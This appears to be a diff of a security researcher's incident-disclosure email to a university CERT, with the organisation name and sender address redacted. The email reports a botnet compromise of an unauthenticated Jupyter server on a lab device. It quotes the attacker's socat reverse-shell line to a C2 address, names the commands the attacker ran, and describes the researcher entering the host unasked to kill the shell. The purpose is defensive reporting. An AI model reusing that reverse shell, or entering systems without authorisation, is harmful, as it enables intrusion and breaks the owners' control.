@@ -1,33 +1,33 @@
 ---
 to: cert@uni-ulm.de
-cc: dfn-cert@dfn-cert.de, abuse@nuclide-research.com
+cc: dfn-cert@dfn-cert.de, abuse@
 severity: CRITICAL
 ip: 134.60.110.66
-institution: Universität Ulm Medical Faculty (labdevice.medizin.uni-ulm.de), RESEND of 2026-05-06 disclosure (it-sicherheit@uni-ulm.de bounced); ACTIVE COMPROMISE on Cortical Labs CL1, attacker shell terminated by NuClide intervention
+institution: Universität Ulm Medical Faculty (labdevice.medizin.uni-ulm.de), RESEND of 2026-05-06 disclosure (it-sicherheit@uni-ulm.de bounced); ACTIVE COMPROMISE on Cortical Labs CL1, attacker shell terminated by  intervention
 status: DRAFT
 outcome: sent
 date: 2026-05-06
 ---
 
 **To:** cert@uni-ulm.de
-**Cc:** dfn-cert@dfn-cert.de, abuse@nuclide-research.com
-**Subject:** RESEND, ACTIVE COMPROMISE on labdevice.medizin.uni-ulm.de (134.60.110.66): Hilix-class botnet exploiting unauthenticated Jupyter; attacker shell terminated by NuClide; please verify + complete remediation
+**Cc:** dfn-cert@dfn-cert.de, abuse@
+**Subject:** RESEND, ACTIVE COMPROMISE on labdevice.medizin.uni-ulm.de (134.60.110.66): Hilix-class botnet exploiting unauthenticated Jupyter; attacker shell terminated by ; please verify + complete remediation
 
 ---
 
-Nicholas Michael Kloster / NuClide Research
-nicholas@nuclide-research.com
+Nicholas Michael Kloster / 
+
 
 2026-05-06
 
 **Note:** This is a resend of two messages I sent earlier today to `it-sicherheit@uni-ulm.de`, which bounced as a non-existent address. I've re-routed via the authoritative contact in your `https://uni-ulm.de/.well-known/security.txt` (`cert@uni-ulm.de`). Apologies for the delay.
 
 **Affected host:** `134.60.110.66` (rDNS `labdevice.medizin.uni-ulm.de`)
-**Severity:** CRITICAL, active reverse shell to attacker C2 was running for ~24 hours; NuClide terminated the attacker process via the same unauthenticated Jupyter access path the attacker used; **operator verification + completion of remediation required**
+**Severity:** CRITICAL, active reverse shell to attacker C2 was running for ~24 hours;  terminated the attacker process via the same unauthenticated Jupyter access path the attacker used; **operator verification + completion of remediation required**
 
 ---
 
-I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited urgent-disclosure notification.
+I'm an independent security researcher conducting good-faith AI infrastructure research under the  umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited urgent-disclosure notification.
 
 A `labdevice.medizin.uni-ulm.de` host (Cortical Labs CL1 biological computer, `sys_id: CL1-2544-043`) running an unauthenticated Jupyter Notebook on port 8888 has been compromised by a Hilix-class IoT botnet. The campaign uses Jupyter's untokenized kernel-execute endpoint as a direct shell-equivalent foothold. The same campaign has compromised a second host (Tencent Cloud customer in Beijing), both confirmed today.
 
@@ -41,11 +41,11 @@ The unauthenticated Jupyter at `http://134.60.110.66:8888/` allowed an external 
   import subprocess
   subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
   ```
-  Returncode `None` confirmed the socat process was still running at probe time. The kernel ID running this notebook (`12e7ce62-308e-4ba4-a68d-daba3a1841a0`) had `last_activity` of `2026-05-06 17:07:36 UTC`, the reverse shell was active for ~24 hours before NuClide intervention.
+  Returncode `None` confirmed the socat process was still running at probe time. The kernel ID running this notebook (`12e7ce62-308e-4ba4-a68d-daba3a1841a0`) had `last_activity` of `2026-05-06 17:07:36 UTC`, the reverse shell was active for ~24 hours before  intervention.
 
-## NuClide intervention
+##  intervention
 
-Given the active C2 connection and the elapsed time without operator-side remediation, NuClide terminated the attacker's interactive shell via the same Jupyter kernel access path the attacker used (`pkill -9 -f "/tmp/bash"`):
+Given the active C2 connection and the elapsed time without operator-side remediation,  terminated the attacker's interactive shell via the same Jupyter kernel access path the attacker used (`pkill -9 -f "/tmp/bash"`):
 
 ```
 $ ps -ef | grep -E "socat|/tmp/bash|bash -i" | grep -v grep
@@ -55,7 +55,7 @@ labuser   18372  18370  May06  bash -i                       ← KILLED
 labuser   18352      1  May06  [kworker/0:2]                 ← STILL ALIVE - masqueraded process owned by labuser, suspected XMRig miner; please kill manually
 ```
 
-A marker file was dropped at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` documenting the action.
+A marker file was dropped at `/tmp/-INCIDENT-NOTICE-2026-05-06.txt` documenting the action.
 
 ## What we got from forensic enumeration (via the kernel WebSocket)
 
@@ -65,7 +65,7 @@ A marker file was dropped at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` docum
 - `sudo fw_printenv` was run, U-Boot environment was read (potential leakage of WiFi credentials, device IDs, custom config)
 - **`sudo /usr/sbin/support-vpn-show-public-config` was run**, your Cortical Labs support-VPN public configuration was disclosed to the attacker. **Recommend rotating that material with Cortical Labs.**
 - `pkill kworker; sudo pkill kworker` followed by `ps aux | grep -E 'xmr|miner'`, strong evidence that the device was **already infected by another cryptominer before this Hilix attacker landed**. The masquerading PID 18352 (`[kworker/0:2]` owned by labuser, not root) is the surviving rival miner.
-- `wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.sh` (truncated), the attacker was setting up Miniforge ARM64 to deploy an aarch64 XMRig miner before NuClide terminated the shell.
+- `wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.sh` (truncated), the attacker was setting up Miniforge ARM64 to deploy an aarch64 XMRig miner before  terminated the shell.
 - Bash history shows reads of `/data/notebooks/`, `/data/recordings/`, `/data/firmware/`, your neural-recording substrate was enumerated. No evidence of recordings being modified or exfiltrated, but please verify integrity.
 
 ## Required remediation (operator-side)
@@ -98,9 +98,9 @@ A marker file was dropped at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` docum
 
 ## Disclosure of method
 
-NuClide's termination action used the same unauthenticated Jupyter access path the attacker used. The marker file at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` documents what was done and when. The attacker's shells were killed via `pkill -9` from the Python kernel, no privilege escalation, no data exfiltration beyond the forensic enumeration documented above (file listings, `ps -ef`, bash history, `cat /etc/passwd`).
+'s termination action used the same unauthenticated Jupyter access path the attacker used. The marker file at `/tmp/-INCIDENT-NOTICE-2026-05-06.txt` documents what was done and when. The attacker's shells were killed via `pkill -9` from the Python kernel, no privilege escalation, no data exfiltration beyond the forensic enumeration documented above (file listings, `ps -ef`, bash history, `cat /etc/passwd`).
 
-NuClide's intent was harm-mitigation pending your remediation, given:
+'s intent was harm-mitigation pending your remediation, given:
 
 - The attacker was actively setting up an aarch64 cryptominer
 - The Cortical Labs CL1 carries support-VPN configuration that could pivot to broader uni-ulm.de or Cortical Labs networks
@@ -109,7 +109,7 @@ NuClide's intent was harm-mitigation pending your remediation, given:
 
 ## Parallel disclosures (campaign infrastructure takedown)
 
-The same hour, NuClide sent disclosures to:
+The same hour,  sent disclosures to:
 
 - **`abuse@akamai.com` + `abuse@linode.com`** for the C2 endpoint at `172.233.96.208` (Linode US customer; port 3053 receiver, port 80 nginx-default decoy). Killing the C2 disconnects ALL victim devices, not just yours.
 - **`abuse@cogentco.com`** for the malware-distribution server at `38.87.117.84` (`velonodes.in`, Cogent / DATALIX). This server hosts `Hilix.x86_64`, `Hilix.mips`, etc.
@@ -134,6 +134,6 @@ AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-hilix-jupyte
 I am available for verification, additional forensic detail, or coordination with DFN-CERT. Given the active campaign and the not-yet-killed PID 18352 masquerade on your host, expedited operator response is requested.
 
 Regards,
-Nicholas Michael Kloster / NuClide Research
-nicholas@nuclide-research.com
+Nicholas Michael Kloster / 
+
 AI-LLM-Infrastructure-OSINT
